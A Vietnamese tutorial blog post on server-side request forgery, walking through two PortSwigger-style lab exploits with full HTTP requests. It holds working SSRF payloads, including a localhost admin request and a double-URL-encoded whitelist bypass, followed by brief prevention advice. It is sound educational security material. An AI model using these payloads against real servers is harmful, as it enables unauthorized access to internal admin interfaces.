## SSRF là gì?

Server-side request forgery (SSRF) là một lỗ hổng web cho phép attacker thực hiện ở phía server các requests đến domain tùy ý của kẻ tấn công.

Trong SSRF, các attacker có thể khiến máy chủ kết nối đến chính dịch vụ của nó hoặc các dịch vụ của bên thứ ba nào đó.

![](https://images.viblo.asia/0b192762-6c39-4255-ad05-0e58ea99deb0.png)

## Hậu quả

Một cuộc tấn công SSRF thành công có thể dẫn đến cách hành động truy cập dữ liệu trái phép trong một tổ chức, trong chính ứng dụng đó hoặc trong các hệ thống back-end khác mà ứng dụng đó có thể giao tiếp. Trong một số trường hợp SSRF có thể dẫn đến attacker có thể thực hiện `command execution`.

## Một số cách thức tấn công

#### 1. Tấn công máy chủ cục bộ
Giả sử có một trang web bán hàng mà kẻ tấn công muốn truy cập đến trang `admin`:

Attacker truy cập trực tiếp trang `admin` từ phía client
```http
GET /admin HTTP/1.1
Host: xyz.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=xyz
Upgrade-Insecure-Requests: 1
```

Sau khi truy cập trang `admin` từ phía client thì attacker nhận được mã `401 Unauthorized` và message thông báo `Admin interface only available if logged in as an administrator, or if requested from loopback` nghĩa là chúng ta không thể truy cập trực tiếp được trang quản trị admin với một vai trò người dùng thường.

```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 1940
...
...
...

<div class="container is-page">
    Admin interface only available if logged in as an administrator, or if requested from loopback
</div>
```
Tại trang web bán hàng này có chức năng xem các sản phẩm có tại các cửa hàng đó hay không. Để cung cấp thông tin cho khách hàng thì ứng dụng đã truy vấn đến các REST APIs khác nhau. Chức năng này được thực hiện bằng các chuyển URL đến `endpoint back-end API` thông qua `front-end HTTP request`.

```http
POST /product/stock HTTP/1.1
Host: xyz.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xyz.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://xyz.web-security-academy.net
Content-Length: 97
Connection: close
Cookie: session=xyz

stockApi=http%3a//stock.weliketoshop.net%3a8080/product/stock/check%3fproductId%3d1%26storeId%3d1
```
Dựa vào các thức mà ứng dụng gửi yêu cầu attacker đã thay đổi yêu cầu truy cập đến trang quản trị `admin`
```shell
stockApi=http%3a//stock.weliketoshop.net%3a8080/product/stock/check%3fproductId%3d1%26storeId%3d1
```

```http
POST /product/stock HTTP/1.1
Host: xyz.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xyz.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://xyz.web-security-academy.net
Content-Length: 31
Connection: close
Cookie: session=xyz

stockApi=http://localhost/admin
```
Như vậy là attacker đã  truy cập thành công trang `admin`.
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=xyz; Secure; HttpOnly
Connection: close
Content-Length: 2562
...
...
...

<section class="maincontainer">
    <div class="container is-page">
        <section>
            <h1>Users</h1>
            <div>
                <span>administrator - </span>
                <a href="/admin/delete?username=administrator">Delete</a>
            </div>
            <div>
                <span>carlos - </span>
                <a href="/admin/delete?username=carlos">Delete</a>
            </div>
            <div>
                <span>wiener - </span>
                <a href="/admin/delete?username=wiener">Delete</a>
            </div>
        </section>
        <br>
        <hr>
    </div>
</section>
```
Vì sao xảy ra những vấn đề như vậy:
* Việc kiểm tra kiểm soát truy cập được thực hiện ở phía front-end mà không phải phía server.
* Ứng dụng cho phép truy cập trang quản trị mà không cần đăng nhập, có thể truy cập đối với bất kỳ người dùng nào từ phía local.

#### 2. Tấn công SSRF với while list input filters

Thường một số ứng dụng chỉ cho phép một số đầu vào mà của người dùng như bắt đầu bằng, matches,... với while list mà họ đã định ra. Đôi khi chúng ta có thể khai thác sự không đồng nhất trong việc phân tích URL.

Đây là cấu trúc một URL dựa vào đó mà ta có thể khai thác cách phần tích URL của một máy chủ
```shell
scheme://user:pass@host:port/path?query=value#fragment
```
* Thêm thông tin đăng nhập vào URL trước hostname
* Sử dụng # để chỉ ra nội dung của mục con.
* URL-encode
* Có thể sử dụng kết hợp tất cả các trên tùy vào mỗi ứng dụng mà họ filters khác nhau.

Vẫn giống ví dụ trước cũng là một trang bán hàng có chức năng xem các sản phẩm có ở đó hay không, nhưng lần này ứng dụng đã kiểm tra kỹ hơn đầu vào mà người dùng nhập vào.

Trong trường hợp này attacker cũng đổi host nhưng đã bị chặn lại bởi ứng dụng web chỉ chấp thuận host `stock.weliketoshop.net`
```http

POST /product/stock HTTP/1.1
Host: xyz.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xyz.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://xyz.web-security-academy.net
Content-Length: 25
Connection: close
Cookie: session=xyz

stockApi=http://127.0.0.1

```

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json
Connection: close
Content-Length: 58

"External stock check host must be stock.weliketoshop.net
```

Khi không thay đổi được host attacker thử thêm username vào URL thì nhận được response `Internal Server Error` điều này khiến cho attacker nghi ngờ rằng chúng đang cố gắng kết nối đến  server là "username".

```http
POST /product/stock HTTP/1.1
Host: xyz.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xyz.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://xyz.web-security-academy.net
Content-Length: 47
Connection: close
Cookie: session=xyz

stockApi=http://username@stock.weliketoshop.net
```
```http
HTTP/1.1 500 Internal Server Error
Content-Type: application/json
Connection: close
Content-Length: 51

"Could not connect to external stock check service"
```

Khi đó attacker thử kết nối đến server `localhost` với `#fragment` là `@stock.weliketoshop.net` và kết quả là  vẫn không thu được gì.

```http
POST /product/stock HTTP/1.1
Host: xyz.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xyz.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://xyz.web-security-academy.net
Content-Length: 49
Connection: close
Cookie: session=xyz

stockApi=http://localhost#@stock.weliketoshop.net
```
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json
Connection: close
Content-Length: 58

"External stock check host must be stock.weliketoshop.net"
```

Cho đến khi attacker `Double-URL encode` và nhận được response `200 OK` thì một trong những kết quả tồi tệ nhất của một trang web khi bị attack cũng đã xuất hiện ^_^

```http
POST /product/stock HTTP/1.1
Host: xyz.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xyz.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://xyz.web-security-academy.net
Content-Length: 53
Connection: close
Cookie: session=xyz

stockApi=http://localhost%2523@stock.weliketoshop.net
```
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=xyz; Secure; HttpOnly
Connection: close
Content-Length: 10767
...
...

<section class="top-links">
       <a href="/login">Account login</a> |
      <a href="/admin">Admin panel</a> |
</section>
```

Đến đây attacker có thể vào trang `admin` như một người quản trị bình thường
```http
POST /product/stock HTTP/1.1
Host: xyz.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xyz.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://xyz.web-security-academy.net
Content-Length: 59
Connection: close
Cookie: session=xyz

stockApi=http://localhost%2523@stock.weliketoshop.net/admin
```
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=xyz; Secure; HttpOnly
Connection: close
Content-Length: 2566
...
...
...

<section>
    <h1>Users</h1>
    <div>
        <span>administrator - </span>
        <a href="/admin/delete?username=administrator">Delete</a>
    </div>
    <div>
        <span>carlos - </span>
        <a href="/admin/delete?username=carlos">Delete</a>
    </div>
    <div>
        <span>wiener - </span>
        <a href="/admin/delete?username=wiener">Delete</a>
    </div>
</section>
```

Những nguyên nhân xảy ra:
* Do việc xử lí URL không được đồng nhất.
* Không kiểm soát hết được input mà người dùng hay attacker truyền vào.

Ngoài ra còn một số kiểu tấn công khác tùy thuộc vào mỗi ứng dụng web đó xử lý và cách lập trình viên xử lý input mà người dùng nhập vào.
## Cách ngăn chặn

Để ngăn ngừa các lỗ hổng SSRF trong ứng dụng web bạn nên sử dụng các `while list` các `domains` và `protocols` được phép truy cập tài nguyên từ phía máy chủ.

Nên tránh sử dụng các chức năng mà người dùng trực tiếp yêu cầu tài nguyên thay cho máy chủ. Ngoài ra bạn cũng nên `filter user input(lọc đầu vào từ người dùng)`, trong trường hợp này nó rất khó để thực hiện bởi vì bạn không thể nắm hết được những `input` mà người dùng nhập vào.

## Tham khảo

https://portswigger.net/web-security/ssrf